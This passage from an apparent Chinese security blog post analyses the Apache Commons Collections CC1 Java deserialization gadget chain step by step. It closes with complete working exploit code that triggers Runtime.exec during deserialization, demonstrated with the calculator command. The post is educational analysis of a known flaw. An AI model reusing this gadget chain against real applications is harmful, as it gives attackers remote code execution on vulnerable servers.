<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>

<p>iMethodName，iParamTypes，iArgs均是通过该类的构造方法控制，即由我们控制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>现在我们即可构造一个可以导致命令执行的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">invokerTransformer.transform(runtime);</span><br></pre></td></tr></table></figure>

<p>运行一下，成功弹出计算器</p>
<p><img src="/../images/Java%E5%AE%89%E5%85%A8-cc1%E9%93%BE%E5%88%86%E6%9E%90/image-20230501213825122.png" alt="image-20230501213825122"></p>
<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>有了执行命令的链，需要找一个方法可以自动调用transform方法，其中可利用的为TransformedMap的checkSetValue方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>valueTransformer通过构造器赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是构造方法为protected，只能本类调用。</p>
<p>又找到decorate()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>decorate是一个public方法，可以为构造器赋值，这样一来，valueTransformer也可以由我们控制，此时找一下哪个方法调用了checkSetValue()方法，只有一处调用，在AbstractInputCheckedMapDecorator类中的setValue()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Entry代表map中的一个键值对，实际上AbstractMapEntryDecorator类重写了Map的setValue方法，跟进AbstractMapEntryDecorator抽象类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过对Map的遍历触发setValue()方法，代码可以这样改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">map.put(<span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;Object, Object&gt; entry : decorate.entrySet()) &#123;</span><br><span class="line">    entry.setValue(runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在decorate下个断点调试一下</p>
<p>首先给TransformedMap进行赋值，valueTransformer赋值为了invokerTransformer</p>
<p><img src="/../images/Java%E5%AE%89%E5%85%A8-cc1%E9%93%BE%E5%88%86%E6%9E%90/image-20230502160700597.png" alt="image-20230502160700597"></p>
<p>走到这里时开始遍历键值对</p>
<p><img src="/../images/Java%E5%AE%89%E5%85%A8-cc1%E9%93%BE%E5%88%86%E6%9E%90/image-20230502161020819.png" alt="image-20230502161020819"></p>
<p>继续往下走，就会来到setValue()方法，value的值为Runtime对象</p>
<p><img src="/../images/Java%E5%AE%89%E5%85%A8-cc1%E9%93%BE%E5%88%86%E6%9E%90/image-20230502161126948.png" alt="image-20230502161126948"></p>
<p>继续走，就来到了checkSetValue()方法，这里调用了transform()方法</p>
<p><img src="/../images/Java%E5%AE%89%E5%85%A8-cc1%E9%93%BE%E5%88%86%E6%9E%90/image-20230502161247065.png" alt="image-20230502161247065"></p>
<p>再走就到了transform()方法，开始反射调用</p>
<p><img src="/../images/Java%E5%AE%89%E5%85%A8-cc1%E9%93%BE%E5%88%86%E6%9E%90/image-20230502161328021.png" alt="image-20230502161328021"></p>
<p>最终执行命令</p>
<p><img src="/../images/Java%E5%AE%89%E5%85%A8-cc1%E9%93%BE%E5%88%86%E6%9E%90/image-20230502161355620.png" alt="image-20230502161355620"></p>
<p>此时说明这条链是可以用的，在查找一下哪里调用了setValue()方法。</p>
<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>在AnnotationInvocationHandler类的readObject()中，调用了setValue()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到此，这条链已经完成，但是还存在几个问题：</p>
<ol>
<li>AnnotationInvocationHandler不能在包外实例化，因为他的构造器没有写类型，所以就是默认访问修饰符，只能在包内实例化</li>
<li>Runtime不能被序列化</li>
<li>setValue()方法的参数不可控</li>
</ol>
<p>所以要继续优化</p>
<p>AnnotationInvocationHandler不能在包外实例化，可以通过反射的方式来获得实例对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotation</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">annotation.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotation.newInstance(Override.class,decorate);</span><br></pre></td></tr></table></figure>

<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformer也是实现了Transformer接口的类，构造方法传入了一个transformer的数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它重写了transform()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它的主要功能是将多个Transformer串联在一起，形成一个转换链。即将前一个回调返回的结果做为下一个回调的输入。</p>
<p>优化一下代码，可以这样写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers).transform(Runtime.class);</span><br></pre></td></tr></table></figure>

<p>这样就可以解决Runtime不能被序列化的问题，因为现在没有序列化Runtime而是Class类</p>
<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformer中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>transform返回什么值与transform的参数无关，只会返回构造方法传入的对象，此时代码可以改为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>此时只要调用transform()就会返回iConstant，iConstant在构造方法中被赋值为Runtime.class，解决了setValue值不可控的问题。</p>
<h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><p>此时加上反序列化的完整代码为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(map, <span class="literal">null</span>, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotation</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotation.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotation.newInstance(Override.class,decorate);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;2.反序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是运行后并没有成功执行命令，是因为在AnnotationInvocationHandler中，通过调试发现，并没有走到setValue那一步</p>
<p><img src="/../images/Java%E5%AE%89%E5%85%A8-cc1%E9%93%BE%E5%88%86%E6%9E%90/image-20230502165518272.png" alt="image-20230502165518272"></p>
<p>在此时，var7 &#x3D; null，不满足条件，所以不能执行命令</p>
<p>让var7不为null需要两个条件：</p>
<ol>
<li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</li>
<li>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</li>
</ol>
<p>Annotation是所有注解的父接口，所有的注解都是他的子类，我们刚刚的代码中用的是Override.class，但是在Override中没有方法，所以需要换一个注解，可以用Target.class，且在map中需要有一个键名为Target类中的方法名，所以最终代码应该是这样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(map, <span class="literal">null</span>, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotation</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotation.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotation.newInstance(Target.class,decorate);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;2.反序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Java%E5%AE%89%E5%85%A8-cc1%E9%93%BE%E5%88%86%E6%9E%90/image-20230502170439976.png" alt="image-20230502170439976"></p>
<p>成功执行命令。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>代码审计知识星球-Java安全漫谈</p>
<p><a href="https://www.freebuf.com/articles/web/359829.html">java反序列化-cc1链分析</a></p>
<p><a href="https://www.secpulse.com/archives/188750.html">Java反序列化之CC1链分析 | 技术精选0142</a></p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
        <tag>cc1</tag>
      </tags>
  </entry>
</search>
